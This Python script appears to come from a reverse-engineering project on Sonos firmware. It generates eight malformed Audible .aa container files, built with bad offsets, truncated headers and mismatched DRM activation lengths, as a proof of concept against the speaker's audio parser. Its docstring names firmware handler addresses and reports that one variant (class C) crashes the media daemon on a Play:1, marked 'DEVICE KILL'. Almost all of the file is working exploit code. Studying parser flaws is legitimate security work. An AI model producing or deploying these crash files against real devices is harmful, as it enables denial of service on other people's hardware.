#!/usr/bin/env python3
"""Minimal-PoC .aa generator for the Sonos Audible container lane (bead frankensonos-tnzm).

Format per ffmpeg libavformat/aadec.c: 4-byte magic 57 90 75 36, then a TOC of
{u8 type; u32 offset; u32 length} entries terminated by type=0; type 1 = codec
blob, 2 = activation, 3 = metadata. Sonos parses the same container via its
audio/audible path (dispatcher 0x10123f84, handler 0x10118ad8 on 57.23).

Classes:
  A  TOC entry offset past EOF      -> drives the seek/read path
  B  zero-length codec blob         -> codec-selection edge
  C  activation length mismatch     -> activation/DRM blob parse (DEVICE KILL, see doc)
  D  truncated magic                -> header gate
  E  giant offset 0xFFFFFFFF        -> 32-bit offset arithmetic
  F  TOC overlap (offset into TOC)  -> self-referential parse
  G  aax-style short activation     -> DRM GUID parse with short blob
  H  valid minimal control          -> accepted, plays through

Verdicts on .84 (Play:1 stand-alone coordinator, this session): A/B/D accepted
and healthy; C ACCEPT -> daemon down (watchdog recovery); H accepted. See
docs/RE_AUDIBLE.md for the full table.
"""
import struct, sys, os

MAGIC = bytes([0x57, 0x90, 0x75, 0x36])
CODEC = b"acelp"


def toc(t, off, ln):
    return struct.pack(">BII", t, off, ln)


def aa(entries, extra=b""):
    """entries: list of (type, content) where content bytes = append at next
    offset; int = explicit (offset, length) both set to that value."""
    out = bytearray(MAGIC)
    body = 4 + 9 * len(entries) + 9
    for t, content in entries:
        if isinstance(content, bytes):
            out += toc(t, body, len(content))
            body += len(content)
        else:
            out += toc(t, content, content)
    out += toc(0, 0, 0)
    out += extra
    return bytes(out)


def build(outdir="/tmp/tnzm_poc"):
    os.makedirs(outdir, exist_ok=True)
    act = b"A" * 64
    meta = b'{"title":"x"}'
    w = lambda n, b: open(os.path.join(outdir, n), "wb").write(b)
    w("A_toc_past_eof.aa", aa([(1, CODEC), (2, act), (3, 0xDEAD + 1000)], b"PADDING" + b"X" * 256))
    w("B_codec_zerolen.aa", aa([(1, b""), (2, act)], b"Y" * 256))
    out = bytearray(MAGIC)
    out += toc(1, 77, 5)
    out += toc(2, 82, 64)
    out += toc(0, 0, 0)
    out += b"acelp" + b"ACT"
    w("C_activation_mismatch.aa", bytes(out))
    w("D_trunc_magic.aa", MAGIC[:3] + toc(1, 20, 5) + CODEC)
    w("E_giant_offset.aa", aa([(1, 0xFFFFFFFF), (2, act)], b"Z" * 64))
    w("F_toc_overlap.aa", aa([(1, 1), (2, act)], b"Q" * 128))
    out = bytearray(MAGIC)
    out += toc(1, 30, 5)
    out += toc(2, 40, 128)
    out += toc(0, 0, 0)
    out += CODEC
    out += bytes.fromhex("eb22c69a1e5b4b1ebee4c8f0e12f5f96") + b"\x00" * 8
    w("G_aax_act_short.aa", bytes(out))
    w("H_valid_min.aa", aa([(1, CODEC), (2, act), (3, meta)], b"AUDIBLE-HEADER" * 8 + b"\0" * 4096))


if __name__ == "__main__":
    build(sys.argv[1] if len(sys.argv) > 1 else "/tmp/tnzm_poc")
    for fn in sorted(os.listdir(sys.argv[1] if len(sys.argv) > 1 else "/tmp/tnzm_poc")):
        print(fn)
